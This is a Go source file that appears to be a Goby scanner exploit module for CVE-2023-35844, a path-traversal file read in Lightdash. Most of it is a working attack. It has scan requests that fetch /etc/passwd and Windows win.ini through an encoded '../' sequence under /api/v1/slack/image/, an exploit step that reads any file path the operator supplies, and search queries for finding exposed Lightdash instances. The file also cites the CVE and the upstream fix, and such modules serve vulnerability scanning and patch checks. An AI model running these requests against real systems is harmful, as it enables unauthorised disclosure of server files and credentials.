package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Lightdash packages/backend/src/routers Arbitrary file reading vulnerability",
    "Description": "<p>Lightdash provides an easy-to-use data analysis and visualization platform that helps users gain insights from data faster and supports collaboration and knowledge sharing among teams, which can be exploited by an attacker to read arbitrary files of the target, causing a serious information disclosure</p>",
    "Product": "lightdash",
    "Homepage": "https://github.com/lightdash/lightdash",
    "DisclosureDate": "2023-06-18",
    "PostTime": "2024-03-14",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title=\"Lightdash\" || body=\"/assets/index-MHxhtmBJ\"",
    "GobyQuery": "title=\"Lightdash\" || body=\"/assets/index-MHxhtmBJ\"",
    "Level": "2",
    "Impact": "<p>An attacker can exploit this vulnerability to read arbitrary files of the target, causing serious information leakage</p>",
    "Recommendation": "<p>The author has published the solution <a href=\"https://github.com/lightdash/lightdash/pull/5090\">https://github.com/lightdash/lightdash/pull/5090</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "%2Fetc%2Fpasswd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/slack/image/slack-image%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/api/v1/slack/image/slack-image%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/v1/slack/image/slack-image%2F..%2F..%2F..%2Fetc%2Fpasswd"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/slack/image/slack-image%2F..%2F..%2F..C%3A%2FWindows%2Fwin.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/api/v1/slack/image/slack-image%2F..%2F..%2F..C%3A%2FWindows%2Fwin.ini",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/v1/slack/image/slack-image%2F..%2F..%2F..C%3A%2FWindows%2Fwin.ini"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/slack/image/slack-image%2F..%2F..%2F..{{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "\"status\":\"error\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-35844"
    ],
    "CNNVD": [
        "CNNVD-202306-1373"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Lightdash packages/backend/src/routers 任意文件读取",
            "Product": "lightdash",
            "Description": "<p>Lightdash 提供了一个简单易用的数据分析和可视化平台，帮助用户更快地从数据中获取洞察，并支持团队间的协作和知识共享，攻击者可以利用该漏洞读取目标的任意文件，造成严重的信息泄露<br></p>",
            "Recommendation": "<p>作者已经发布了解决方案&nbsp;<a href=\"https://github.com/lightdash/lightdash/pull/5090\" target=\"_self\">https://github.com/lightdash/lightdash/pull/5090</a><br></p>",
            "Impact": "<p>攻击者可以利用该漏洞读取目标的任意文件，造成严重的信息泄露<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Lightdash packages/backend/src/routers Arbitrary file reading vulnerability",
            "Product": "lightdash",
            "Description": "<p>Lightdash provides an easy-to-use data analysis and visualization platform that helps users gain insights from data faster and supports collaboration and knowledge sharing among teams, which can be exploited by an attacker to read arbitrary files of the target, causing a serious information disclosure<br></p>",
            "Recommendation": "<p>The author has published the solution<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;</span><a href=\"https://github.com/lightdash/lightdash/pull/5090\" target=\"_self\">https://github.com/lightdash/lightdash/pull/5090</a><br></p>",
            "Impact": "<p>An attacker can exploit this vulnerability to read arbitrary files of the target, causing serious information leakage<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10934"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}